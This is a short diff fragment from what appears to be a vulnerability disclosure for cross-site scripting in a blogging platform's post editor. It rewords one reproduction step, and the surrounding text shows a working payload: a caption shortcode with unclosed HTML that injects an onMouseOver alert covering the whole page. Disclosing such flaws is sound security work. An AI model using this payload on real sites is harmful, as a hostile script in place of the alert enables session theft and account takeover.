@@ -116,7 +116,7 @@ Allows to inject web script or HTML by using unclosed HTML elements during proce
 <b>Step by step:</b>
 1. Press "Create a Post" button
 2. Switch from visual editor to text editor by choosing a "Text" tab on the righ upper corner.
-2. Craft and enter example code that triggers alert message:
+2. Using unclosed HTML elements craft and enter example code that triggers alert message:
 ```html
 XSS exploit [caption width='1' caption='<a href="' ">]</a><a href="http://onMouseOver='alert(123)' style='display:block;position:absolute;top:0px;left:0px;margin-left:-1000px;margin-top:-1000px;width:99999px;height:99999px;'"></a>
 ```
